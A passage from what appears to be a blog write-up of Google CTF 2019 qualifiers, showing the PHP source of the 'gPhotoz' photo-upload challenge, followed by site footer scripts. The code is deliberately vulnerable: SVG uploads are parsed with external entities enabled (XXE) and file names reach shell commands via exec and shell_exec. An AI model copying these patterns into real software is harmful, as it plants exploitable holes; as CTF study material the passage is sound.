class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">error_reporting( E_ALL );</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// totally not copy&amp;pasted from somewhere...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_size</span><span class="params">($file, $mime_type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($mime_type == <span class="string">"image/png"</span>||$mime_type == <span class="string">"image/jpeg"</span>) &#123;</span><br><span class="line">        $stats = getimagesize($file);</span><br><span class="line">        $width = $stats[<span class="number">0</span>];</span><br><span class="line">        $height = $stats[<span class="number">1</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $xmlfile = file_get_contents($file);</span><br><span class="line">        $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">        $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        $svg = simplexml_import_dom($dom);</span><br><span class="line">        $attrs = $svg-&gt;attributes();</span><br><span class="line">        $width = (int) $attrs-&gt;width;</span><br><span class="line">        $height = (int) $attrs-&gt;height;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [$width, $height];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">workdir</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $d = <span class="string">'upload/'</span>.md5(session_id());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_dir($d))</span><br><span class="line">        mkdir($d);</span><br><span class="line">    <span class="keyword">return</span> $d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">list_photos</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $d = <span class="string">'upload/'</span>.md5(session_id());</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!is_dir($d)) <span class="keyword">return</span> [];</span><br><span class="line"></span><br><span class="line">    $result = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(glob(<span class="string">"&#123;$d&#125;/*.*"</span>) <span class="keyword">as</span> $f) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($f, <span class="string">'small'</span>) === <span class="keyword">FALSE</span>)</span><br><span class="line">            $result[basename($f)] = $f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_FILES[<span class="string">'photo'</span>]))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    $p = <span class="keyword">new</span> PhotoUpload($_FILES[<span class="string">'photo'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">    $p-&gt;thumbnail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PhotoUpload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $failed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        $formats = [</span><br><span class="line">            <span class="string">"image/gif"</span> =&gt; <span class="string">"gif"</span>,</span><br><span class="line">            <span class="string">"image/png"</span> =&gt; <span class="string">"png"</span>,</span><br><span class="line">            <span class="string">"image/jpeg"</span> =&gt; <span class="string">"jpg"</span>,</span><br><span class="line">            <span class="string">"image/svg+xml"</span> =&gt; <span class="string">"svg"</span>,</span><br><span class="line">            <span class="comment">// Uncomment when launching gVideoz</span></span><br><span class="line">            <span class="comment">//"video/mp4" =&gt; "mp4",</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $mime_type = mime_content_type($path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!array_key_exists($mime_type, $formats)) &#123;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $size = get_size($path, $mime_type);</span><br><span class="line">        <span class="keyword">if</span> ($size[<span class="number">0</span>] * $size[<span class="number">1</span>] &gt; <span class="number">65536</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = $formats[$mime_type];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = hash_hmac(<span class="string">'md5'</span>, uniqid(), $secret).<span class="string">".&#123;$this-&gt;ext&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        move_uploaded_file($path, workdir().<span class="string">"/&#123;$this-&gt;name&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">thumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         exec(escapeshellcmd(<span class="string">'convert '</span>.workdir().<span class="string">"/&#123;$this-&gt;name&#125;"</span>.<span class="string">' -resize 128x128 '</span>.workdir().<span class="string">"/&#123;$this-&gt;name&#125;_small.jpg"</span>), $out, $ret);</span><br><span class="line">         <span class="keyword">if</span> ($ret)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;failed = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;failed) &#123;</span><br><span class="line">            shell_exec(escapeshellcmd(<span class="string">'rm '</span>.workdir().<span class="string">"/&#123;$this-&gt;name&#125;"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'action'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">            upload();</span><br><span class="line">            header(<span class="string">'Location: ?'</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'src'</span>:</span><br><span class="line">            show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;gPhotoz&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;form action=<span class="string">"?action=upload"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"file"</span> name=<span class="string">"photo"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Upload"</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">foreach</span>(list_photos() <span class="keyword">as</span> $name =&gt; $path): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;a href=<span class="string">"&lt;?=$path?&gt;"</span> alt=<span class="string">"&lt;?=$name?&gt;"</span>&gt;&lt;img src=<span class="string">"&lt;?=$path.'_small.jpg'?&gt;"</span>&gt;&lt;/a&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">endforeach</span> <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;a href=<span class="string">"?action=src"</span>&gt;&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-BNV"><span class="toc-number">2.</span> <span class="toc-text">0x01 BNV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-gLotto"><span class="toc-number">3.</span> <span class="toc-text">0x02 gLotto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-gphotos"><span class="toc-number">4.</span> <span class="toc-text">0x03 gphotos</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&text=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&is_video=false&description=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Google Capture The Flag 2019 (Quals) WP&body=Check out this article: http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&name=Google Capture The Flag 2019 (Quals) WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 z3r0yu
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-129276044-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'z3r0yu';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


